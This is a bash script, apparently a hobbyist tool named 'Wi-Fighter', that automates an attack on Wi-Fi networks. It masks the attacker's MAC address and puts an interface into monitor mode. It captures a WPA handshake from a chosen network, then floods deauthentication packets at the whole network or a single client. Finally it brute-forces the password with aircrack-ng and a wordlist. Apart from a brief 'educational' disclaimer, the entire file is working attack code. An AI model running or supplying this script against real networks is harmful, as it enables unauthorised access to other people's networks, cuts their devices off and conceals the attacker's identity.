#!/bin/bash

#Script made by rootforce.
#Disclaimer: Developers assume no liability and are not    ::
#responsible for any misuse or damage caused by this script.  ::
#Only use for educational purporses!! 



#It handles CTR+C. When ctr+c is pressed it only prints OK so it doesn't dissrupt the script.
function ctrl_c {
  echo -e "\n OK"
}

#ASCII ART

echo "                         
░██╗░░░░░░░██╗██╗░░░░░░███████╗██╗░██████╗░██╗░░██╗████████╗███████╗██████╗░
░██║░░██╗░░██║██║░░░░░░██╔════╝██║██╔════╝░██║░░██║╚══██╔══╝██╔════╝██╔══██╗
░╚██╗████╗██╔╝██║█████╗█████╗░░██║██║░░██╗░███████║░░░██║░░░█████╗░░██████╔╝
░░████╔═████║░██║╚════╝██╔══╝░░██║██║░░╚██╗██╔══██║░░░██║░░░██╔══╝░░██╔══██╗
░░╚██╔╝░╚██╔╝░██║░░░░░░██║░░░░░██║╚██████╔╝██║░░██║░░░██║░░░███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
"


#Menu
echo -e "           -------------- Select option ---------------  \n
           1.Search for a Target Network (Step 1) \n
           2.Attack the Network and Brute Force the Password (Step 2)           "

read choice


if [ $choice -eq '1' ];
then
	
	#kills procceses that may cause trouble
	airmon-ng check kill
	
	echo "Tip: You can find the diserible interface by opening a new terminal and pressing ifconfig!"
	echo "Enter which wlan to start in monitor mode=>"
	read givenwlan
	
	#Masking your MAC address
	sudo ifconfig $givenwlan down
	sudo macchanger -r $givenwlan
	ifconfig $givenwlan up
	
	#starts wlan interface
	airmon-ng start $givenwlan

	echo "---Press Ctrl+C after noting the bssid and channel of the target network---"
	sleep 3
	#starts monitoring networks nearby
	airodump-ng $givenwlan
	sleep 5
	trap ctrl_c SIGINT

	echo "Enter the BSSID =>"
	read bssid

	echo "Enter the channel of the Router =>"
	read chan

	echo "Enter the destination and name of the file to write =>"
	read filename

	 ###      -e     enables interpretation of backslash escapes     ###
	echo -e "------------------\n|Check here for the handshake|---------------------|"
	echo -e "\n|Open a new tab and run script again with option 2|-------------------|"
	sleep 5
	
	#Waiting for the handshake while deauthing in a new terminal
	sudo airodump-ng --bssid $bssid -c $chan -w $filename $givenwlan
else

	echo -e "           -------------- Select option ---------------  \n
		   1. Deauth all the network\n
		   2. Deauth specific client (More accurate)           "
	read choice2
	echo "Give mon name (wlan0?)"
	read amonname
		if [ $choice2 -eq '1' ];
			then

				echo "Enter Networks BSSID =>"
				read bssid
				  
				echo "---Press Ctrl+C after the handshake---\n \n"

				sleep 2
				#deauths the entire network
				sudo aireplay-ng --deauth 50 -a $bssid $amonname
			else
				echo "Enter Networks BSSID =>"
				read bssid
				echo "Enter target's BSSID =>"
				read tbssid
				
				echo "---Press Ctrl+C after the handshake---\n \n"

				sleep 2
				#deauths a specific client of the network
				sudo aireplay-ng --deauth 50 -a $bssid -c $tbssid $amonname
		fi

	echo "Enter path of .cap file =>"
	read capfile

	echo "Enter path of wordlist"
	read wrdlist
	
	#bruteforces the handshake in the capfile with the help of a worldlist
	sudo aircrack-ng $capfile -w $wrdlist 

fi